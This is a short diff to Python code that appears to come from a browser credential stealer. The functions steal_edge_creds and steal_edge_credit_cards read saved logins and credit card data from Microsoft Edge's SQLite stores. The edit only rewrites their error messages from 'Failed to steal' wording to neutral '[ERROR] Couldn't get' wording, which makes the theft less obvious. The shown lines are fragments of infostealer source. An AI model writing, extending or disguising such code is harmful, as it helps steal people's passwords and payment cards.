@@ -101,7 +101,7 @@ def steal_edge_creds(): # get edge credentials
         edge_creds = __get_edge_creds(cur)
         con.close() # Close SQLite3 connection
     except:
-        edge_creds = "Failed to steal edge creds"
+        edge_creds = "[ERROR] Couldn't get edge creds"
     finally:
         return edge_creds
     
@@ -113,6 +113,6 @@ def steal_edge_credit_cards(): # get edge credit cards
         credit_cards = __get_edge_credit_cards(cur)
         con.close() # Close SQLite3 connection
     except:
-        credit_cards = "Failed to steal edge credit cards"
+        credit_cards = "[ERROR] Couldn't get edge credit cards"
     finally:
         return credit_cards
